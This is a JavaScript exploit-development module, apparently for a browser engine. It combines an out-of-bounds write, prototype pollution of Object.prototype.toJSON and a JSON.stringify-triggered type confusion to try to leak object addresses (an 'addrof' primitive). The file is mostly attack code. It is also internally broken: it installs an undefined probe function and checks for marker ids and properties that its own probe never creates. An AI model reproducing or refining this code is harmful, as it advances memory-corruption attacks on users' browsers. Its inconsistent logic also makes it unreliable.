// js/script3/testArrayBufferVictimCrash.mjs (v87_StableTC_AggressiveGetterAndFuzz)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V87_STCAGF = "OriginalHeisenbug_TypedArrayAddrof_v87_StableTCGetterFuzz";

const VICTIM_BUFFER_SIZE = 256;
const OOB_TARGET_OFFSETS_V87 = [0x7C]; // Focar no offset estável por enquanto
const OOB_WRITE_VALUES_V87 = [0xFFFFFFFF, 0x7FFFFFFF]; 
const AGGRESSIVE_PROP_COUNT_V87 = 8; // Reduzido para chances de evitar TypeError muito cedo
const PROBE_CALL_LIMIT_V87 = 7; 

// Globais para o módulo de teste
let object_to_leak_A_v87 = null;
let object_to_leak_B_v87 = null;
let victim_typed_array_ref_v87 = null; 
let probe_call_count_v87 = 0;
let marker_M1_ref_v87 = null; // Ref para o objeto retornado pela Call #1
let marker_M2_ref_v87 = null; // Ref para o objeto retornado pela Call #2 (nosso alvo de TC)
// Armazena o objeto de detalhes da Call #3 (onde M2 é 'this' e é confuso)
let details_of_M2_confusion_and_modification_v87 = null; 

function toJSON_TA_Probe_StableTCGetterFuzz() {
    probe_call_count_v87++;
    const call_num = probe_call_count_v87;
    let current_call_log_info = { 
        call_number: call_num,
        probe_variant: "TA_Probe_V87_StableTCGetterFuzz",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v87),
        this_is_M1: (this === marker_M1_ref_v87 && marker_M1_ref_v87 !== null),
        this_is_M2: (this === marker_M2_ref_v87 && marker_M2_ref_v87 !== null),
        m2_summary: null, 
        error_in_probe: null
    };
    logS3(`[PROBE_V87] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    // Atualizar details_of_M2_confusion_and_modification_v87 se esta chamada for a que M2 é 'this' e confuso, ou a última
    if ( (current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') || 
         !details_of_M2_confusion_and_modification_v87 || call_num >= (details_of_M2_confusion_and_modification_v87.call_number || 0) ) {
        details_of_M2_confusion_and_modification_v87 = current_call_log_info;
    }
    
    try {
        if (call_num > PROBE_CALL_LIMIT_V87) { return { recursion_stopped_v87: true }; }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            logS3(`[PROBE_V87] Call #${call_num}: 'this' is victim. Returning M1.`, "info");
            marker_M1_ref_v87 = { marker_id_v87: "M1_Container" }; 
            // M2 não é colocado em M1 ainda, para replicar o padrão onde um ObjX inesperado se torna this na P2
            return marker_M1_ref_v87;
        } else if (call_num === 2 && current_call_log_info.this_type === '[object Object]' && !current_call_log_info.this_is_M1 && !current_call_log_info.this_is_victim) {
            logS3(`[PROBE_V87] Call #${call_num}: 'this' is an unexpected ObjX (${current_call_log_info.this_type}). Creating M2 and returning it.`, "info");
            marker_M2_ref_v87 = { marker_id_v87: "M2_Target_v87", oob_val_info: object_to_leak_A_v87.idA }; // M2 criado e referenciado globalmente
            return marker_M2_ref_v87; // Este M2 será o 'this' da Call #3
        } else if (call_num >= 2 && current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') {
            // ESTE É O ALVO: this é M2 e está confuso!
            logS3(`[PROBE_V87] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v87}. Applying getter, prop, and indexed writes...`, "vuln");
            current_call_log_info.m2_summary = { 
                getter_defined: false, direct_prop_set: false, indexed_writes_done: false, keys_after: "N/A",
                leaked_A_from_getter: "not_fired_or_err", leaky_B_from_direct: "not_set_or_err"
            };
            
            Object.defineProperty(this, 'leaky_A_getter_v87', {
                get: function() {
                    logS3(`[PROBE_V87] !!! Getter 'leaky_A_getter_v87' on confused M2 (this call #${call_num}) FIRED !!!`, "vuln");
                    current_call_log_info.m2_summary.leaked_A_from_getter = object_to_leak_A_v87; // Getter retorna o objeto
                    return object_to_leak_A_v87; 
                }, enumerable: true, configurable: true
            });
            current_call_log_info.m2_summary.getter_defined = true;
            
            this.leaky_B_direct_v87 = object_to_leak_B_v87;
            current_call_log_info.m2_summary.direct_prop_set = true;
            current_call_log_info.m2_summary.leaky_B_from_direct = this.leaky_B_direct_v87;


            for (let i = 0; i < AGGRESSIVE_PROP_COUNT_V87; i++) {
                this[i] = (i % 2 === 0) ? object_to_leak_A_v87 : object_to_leak_B_v87;
            }
            current_call_log_info.m2_summary.indexed_writes_done = true;
            try{ current_call_log_info.m2_summary.keys_after = Object.keys(this).join(','); } catch(e){}
            logS3(`[PROBE_V87] Call #${call_num}: Modifications to M2 ('this') completed. Keys: ${current_call_log_info.m2_summary.keys_after}`, "info");
            
            // details_of_M2_confusion_and_modification_v87 foi atualizado no topo da função
            return this; // Retorna M2 modificado
        } else if (this === object_to_leak_A_v87 || this === object_to_leak_B_v87) {
            logS3(`[PROBE_V87] Call #${call_num}: 'this' is a leak_target_object. Returning simple marker.`, "info");
            return { serializing_leaked_obj_marker_v87: call_num, id_is: this.idA || this.idB };
        }

    } catch (e) { current_call_log_info.error_in_probe = e.message; }
    
    return { generic_marker_v87: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_ReplicateAndExploitM2Confusion() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V87_STCAGF}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (ReplicateM2Confusion_Getter) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V87_STCAGF} Init...`;

    let overall_results = [];

    for (const current_oob_offset of OOB_TARGET_OFFSETS_V87) { // Loop de Offset
        for (const current_oob_value of OOB_WRITE_VALUES_V87) { // Loop de Valor OOB
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${toHex(current_oob_offset)}_Val${toHex(current_oob_value)}`;
            logS3(`\n===== ITERATION: Offset: ${toHex(current_oob_offset)}, Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

            probe_call_count_v87 = 0;
            victim_typed_array_ref_v87 = null; 
            marker_M1_ref_v87 = null;
            marker_M2_ref_v87 = null;
            details_of_M2_confusion_and_modification_v87 = null;
            object_to_leak_A_v87 = { marker_A_v87: `LeakA_O${toHex(current_oob_offset)}V${toHex(current_oob_value)}`, idA: Date.now() }; 
            object_to_leak_B_v87 = { marker_B_v87: `LeakB_O${toHex(current_oob_offset)}V${toHex(current_oob_value)}`, idB: Date.now() + 1 };

            let iterError = null;
            let stringifyOutput_parsed = null; 
            
            let addrof_M2_Getter = { success: false, msg: "M2.leaky_A_getter: Default"};
            let addrof_M2_Direct = { success: false, msg: "M2.leaky_B_direct: Default"};
            let addrof_M2_Indexed = { success: false, msg: "M2[0] (Indexed): Default"};

            try {
                await triggerOOB_primitive({ force_reinit: true });
                oob_write_absolute(current_oob_offset, current_oob_value, 4); // Usa o offset e valor da iteração
                logS3(`  OOB Write: offset ${toHex(current_oob_offset)}, value ${toHex(current_oob_value)} done.`, "info", FNAME_CURRENT_ITERATION);
                await PAUSE_S3(100);

                victim_typed_array_ref_v87 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
                logS3(`STEP 2: victim_typed_array_ref_v87 (Uint8Array) created.`, "test", FNAME_CURRENT_ITERATION);
                
                const ppKey = 'toJSON';
                let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
                let pollutionApplied = false;

                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ReplicateM2Confusion, writable: true, configurable: true, enumerable: false });
                    pollutionApplied = true;
                    let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v87); 
                    logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                    try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } 
                    catch (e_parse) { stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };}
                    
                    // details_of_M2_confusion_and_modification_v87 agora deve ser o current_call_details da chamada onde 'this' era M2 confuso
                    logS3(`  EXECUTE: Details of M2 interaction: ${details_of_M2_confusion_and_modification_v87 ? JSON.stringify(details_of_M2_confusion_and_modification_v87) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                    let heisenbugOnM2 = details_of_M2_confusion_and_modification_v87?.this_is_M2 && 
                                        details_of_M2_confusion_and_modification_v87?.this_type === "[object Object]" &&
                                        details_of_M2_confusion_and_modification_v87?.m2_summary?.getter_defined;
                    logS3(`  EXECUTE: Heisenbug on M2 Target (and getter defined) ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                        
                    // O stringifyOutput_parsed é M1 serializado. M1.payload_M2 é M2 serializado.
                    let m2_from_output = null;
                    if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v87 === "M1_V87_Container" && stringifyOutput_parsed.payload_M2) {
                        m2_from_output = stringifyOutput_parsed.payload_M2; 
                    }

                    if (m2_from_output && m2_from_output.marker_id_v87 === "M2_V87_Target") {
                        logS3("   M2 object found in stringifyOutput. Checking its properties for leaks...", "info", FNAME_CURRENT_ITERATION);
                        const val_getter = m2_from_output.leaky_A_getter_v87; 
                        if (typeof val_getter === 'number' && !isNaN(val_getter) && val_getter !== 0) {
                            let gi64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_getter]).buffer)[0], new Uint32Array(new Float64Array([val_getter]).buffer)[1]);
                            if ((gi64.high() > 0 && gi64.high() < 0x000F0000) || ((gi64.high() & 0xFFFF0000) === 0xFFFF0000 && gi64.high() !== 0xFFFFFFFF )) {
                               addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Ptr from getter: ${gi64.toString(true)}`;
                            } else { addrof_M2_Getter.msg = `Getter val num but not ptr: ${val_getter} (${gi64.toString(true)})`; }
                        } else { addrof_M2_Getter.msg = `Getter val not useful num. Val: ${JSON.stringify(val_getter)}`; }

                        const val_direct = m2_from_output.leaky_B_direct_v87;
                        // (similar check for val_direct)
                        if (val_direct && val_direct.marker_B_v87 === object_to_leak_B_v87.marker_B_v87) {
                            addrof_M2_Direct.success = true; addrof_M2_Direct.msg = "ObjB identity via direct prop.";
                        } else { addrof_M2_Direct.msg = `Direct prop not ObjB identity. Val: ${JSON.stringify(val_direct)}`;}

                        const val_indexed = m2_from_output["0"]; // Checa a propriedade numérica
                        if (val_indexed && val_indexed.marker_A_v87 === object_to_leak_A_v87.marker_A_v87) {
                           addrof_M2_Indexed.success = true; addrof_M2_Indexed.msg = "ObjA identity via M2[0].";
                        } else { addrof_M2_Indexed.msg = `M2[0] not ObjA identity. Val: ${JSON.stringify(val_indexed)}`;}
                    } else { /* M2 não encontrado no output como esperado */ }

                } catch (e_str) { iterError = e_str;
                } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
            } catch (e_outer) { iterError = e_outer;
            } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
            
            overall_results.push({
                oob_offset: toHex(current_oob_offset), oob_value: toHex(current_oob_value), 
                error: iterError ? `${iterError.name}: ${iterError.message}` : null,
                m2_final_details: details_of_M2_confusion_and_modification_v87 ? JSON.parse(JSON.stringify(details_of_M2_confusion_and_modification_v87)) : null, 
                final_stringify_output_parsed_iter: stringifyOutput_parsed,
                addrof_M2_Getter: {...addrof_M2_Getter}, addrof_M2_Direct: {...addrof_M2_Direct}, addrof_M2_Indexed: {...addrof_M2_Indexed},
                probe_calls_this_iter: probe_call_count_v87
            });
            if (addrof_M2_Getter.success || addrof_M2_Direct.success || addrof_M2_Indexed.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V87_STCAGF}: Addr? ${toHex(current_oob_offset)}V${toHex(current_oob_value)} SUCCESS!`;
            }
            await PAUSE_S3(100); 
        } 
    } 

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    // ... (logging resumido e retorno para o runner)
    let final_summary_for_runner = {total_probe_calls:0, addrof_A_result:{success:false}, addrof_B_result:{success:false}, addrof_C_result:{success:false}};
    // ... (lógica para popular final_summary_for_runner com a melhor/última iteração)
    
    return { ...final_summary_for_runner, iteration_results_summary: overall_results.map(r=>({oob_offset:r.oob_offset, oob_value:r.oob_value, getter_ok:r.addrof_M2_Getter.success, direct_ok:r.addrof_M2_Direct.success, idx_ok:r.addrof_M2_Indexed.success, m2_tc:r.m2_final_details?.this_is_M2, error:r.error})) };
}
